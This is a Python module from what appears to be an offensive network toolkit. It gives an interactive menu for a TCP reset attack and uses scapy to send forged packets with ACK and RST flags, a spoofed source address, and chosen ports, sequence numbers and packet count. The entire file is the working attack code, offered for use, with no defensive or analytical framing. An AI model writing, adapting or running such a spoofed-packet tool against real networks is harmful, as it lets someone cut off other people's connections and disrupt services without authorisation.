import os
import subprocess
import readline
import scapy

from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
from scapy.all import sniff, Ether, IP, TCP, send

options = ["192.168.1.2", "192.168.1.3", "8080", "443", "12345", "67890", "10"]
def tcp_reset():
	try:
		pmt0 = f"{Fore.GREEN}plv{Fore.BLUE}/net/tcp_reset>{Style.RESET_ALL}"
		cmd = input(pmt0).lower()
		if(cmd[0:12]=='show options'):
			print('\nTCP Reset attack options:')
			print('--------------------------------')
			print('FROM     ===>  ' + options[0] + '  |  Fake sender of the packets')
			print('TO       ===>  ' + options[1] + '  |  Receiver of the packets')
			print('SPORT    ===>  ' + options[2] + '  |  Source port of the packets')
			print('DPORT    ===>  ' + options[3] + '  |  Destination port of the packets')
			print('SEQ      ===>  ' + options[4] + '  |  Sequence number of the packets')
			print('ACK      ===>  ' + options[5] + '  |  Acknowledgement number of the packets')
			print('COUNT    ===>  ' + options[6] + '  |  Amount of the packets sent\n')
			
		elif(cmd[0:3]=='set'):
		
			if(cmd[4:8]=='from'):
				options[0] = cmd[9:23]
				options[0].replace(" ", "")
				print('\nFROM   ===>  ' + options[0] + '\n')
			elif(cmd[4:6]=='to'):
				options[1] = cmd[7:21]
				options[1].replace(" ", "")
				print('\nTO   ===>  ' + options[1] + '\n')
			elif(cmd[4:9]=='sport'):
				options[2] = cmd[10:15]
				print('\nSPORT   ===>  ' + options[2] + '\n')
			elif(cmd[4:9]=='dport'):
				options[3] = cmd[10:15]
				print('\nDPORT   ===>  ' + options[3] + '\n')
			elif(cmd[4:7]=='seq'):
				options[4] = cmd[7:30]
				print('\nSEQ   ===>  ' + options[4] + '\n')
			elif(cmd[4:7]=='ack'):
				options[5] = cmd[7:30]
				print('\nACK   ===>  ' + options[5] + '\n')
			elif(cmd[4:9]=='count'):
				options[6] = cmd[10:16]
				print('\nCOUNT   ===>  ' + options[6] + '\n')
				
			else:
				print('\nUnknown option!\n')
					
		elif(cmd[0:3]=='run' or cmd[0:7]=='execute'):
			print(f"\n{Fore.RED}Starting the TCP [RST] attack...{Style.RESET_ALL}\n")
			attack(options[0], options[1], int(options[2]), int(options[3]), int(options[4]), int(options[5]), int(options[6]))
		
		elif(cmd[0:4]=='exit'):
			print("\nGood luck, Plova!\n")
			exit(0)
		else:
			print("\nUnknown command! Available options:\nshow options\nset [option] [value]\nexit\nrun\n")
		tcp_reset()
	except(KeyboardInterrupt):
		print("\nExiting module...\n")
def attack(sender, receiver, srcport, dstport, seqn, ackn, pcount):
	ip = IP(src=sender, dst=receiver)
	tcp = TCP(sport=srcport, dport=dstport, seq=seqn, ack=ackn, flags="AR")
	pkt = ip/tcp
	send(pkt, count=pcount)
